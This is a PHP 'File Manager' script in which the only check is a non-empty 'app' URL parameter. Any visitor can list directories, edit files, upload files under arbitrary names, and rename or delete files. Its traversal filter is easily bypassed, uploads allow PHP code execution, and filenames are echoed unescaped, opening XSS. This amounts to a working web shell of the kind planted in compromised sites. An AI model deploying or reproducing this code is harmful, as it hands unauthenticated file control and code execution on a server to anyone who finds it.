<?php
if (!isset($_GET['app']) || empty($_GET['app'])) {
    http_response_code(403);
    exit('🛑 Missing "app" parameter.');
}

// Get current directory
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$currentDir = rtrim($currentDir, '/\\');
if (empty($currentDir)) $currentDir = '.';

// Security: prevent directory traversal attacks
$currentDir = str_replace(['../', '..\\'], '', $currentDir);

if (isset($_GET['file']) && !empty($_GET['file'])) {
    $filepath = $currentDir . DIRECTORY_SEPARATOR . basename($_GET['file']);
    if (isset($_POST['edit'])) {
        file_put_contents($filepath, $_POST['content']);
        header("Location: ?app=" . $_GET['app'] . "&dir=" . urlencode($currentDir));
        exit;
    }
    echo "<h2>Editing: " . htmlspecialchars($_GET['file']) . "</h2>";
    echo "<form method='post'><textarea name='content' style='width:100%;height:400px;'>";
    echo htmlspecialchars(file_get_contents($filepath));
    echo "</textarea><br><button type='submit' name='edit'>Save</button></form>";
    exit;
}

// Upload
if (isset($_FILES['upload'])) {
    $uploadPath = $currentDir . DIRECTORY_SEPARATOR . $_FILES['upload']['name'];
    move_uploaded_file($_FILES['upload']['tmp_name'], $uploadPath);
    header("Location: ?app=" . $_GET['app'] . "&dir=" . urlencode($currentDir));
    exit;
}

// Rename
if (isset($_GET['rename']) && isset($_POST['newname'])) {
    $oldPath = $currentDir . DIRECTORY_SEPARATOR . $_GET['rename'];
    $newPath = $currentDir . DIRECTORY_SEPARATOR . $_POST['newname'];
    rename($oldPath, $newPath);
    header("Location: ?app=" . $_GET['app'] . "&dir=" . urlencode($currentDir));
    exit;
}

// Delete
if (isset($_GET['delete'])) {
    $deletePath = $currentDir . DIRECTORY_SEPARATOR . $_GET['delete'];
    if (is_dir($deletePath)) {
        rmdir($deletePath);
    } else {
        unlink($deletePath);
    }
    header("Location: ?app=" . $_GET['app'] . "&dir=" . urlencode($currentDir));
    exit;
}

echo "<h2>File Manager</h2>";

// Show current directory and navigation
echo "<p><strong>Current Directory:</strong> " . htmlspecialchars($currentDir) . "</p>";

// Back button (go to parent directory)
if ($currentDir !== '.') {
    $parentDir = dirname($currentDir);
    if ($parentDir === '.') $parentDir = '.';
    echo "<a href='?app=" . $_GET['app'] . "&dir=" . urlencode($parentDir) . "'>📁 Back to Parent Directory</a><br><br>";
}

echo "<form method='post' enctype='multipart/form-data'>
    <input type='file' name='upload'>
    <button type='submit'>Upload to Current Directory</button>
</form><hr>";

$files = scandir($currentDir);
echo "<table border='1' cellpadding='5'><tr><th>Type</th><th>Name</th><th>Action</th></tr>";
foreach ($files as $file) {
    if ($file === '.' || $file === '..') continue;
    $fullPath = $currentDir . DIRECTORY_SEPARATOR . $file;
    echo "<tr>";
    
    // Type column
    if (is_dir($fullPath)) {
        echo "<td>📁 DIR</td>";
    } else {
        echo "<td>📄 FILE</td>";
    }
    
    // Name column with navigation for directories
    echo "<td>";
    if (is_dir($fullPath)) {
        $newDir = $currentDir === '.' ? $file : $currentDir . DIRECTORY_SEPARATOR . $file;
        echo "<a href='?app=" . $_GET['app'] . "&dir=" . urlencode($newDir) . "'><strong>$file</strong></a>";
    } else {
        echo $file;
    }
    echo "</td>";
    
    // Action column
    echo "<td>";
    if (is_file($fullPath)) {
        echo "<a href='?app=" . $_GET['app'] . "&dir=" . urlencode($currentDir) . "&file=$file'>Edit</a> | ";
    }
    echo "<form style='display:inline' method='post' action='?app=" . $_GET['app'] . "&dir=" . urlencode($currentDir) . "&rename=$file'>
        <input name='newname' value='$file' size='15'>
        <button type='submit'>Rename</button>
    </form> | ";
    echo "<a href='?app=" . $_GET['app'] . "&dir=" . urlencode($currentDir) . "&delete=$file' onclick='return confirm(\"Delete $file?\")'>Delete</a>";
    echo "</td></tr>";
}
echo "</table>";
?>
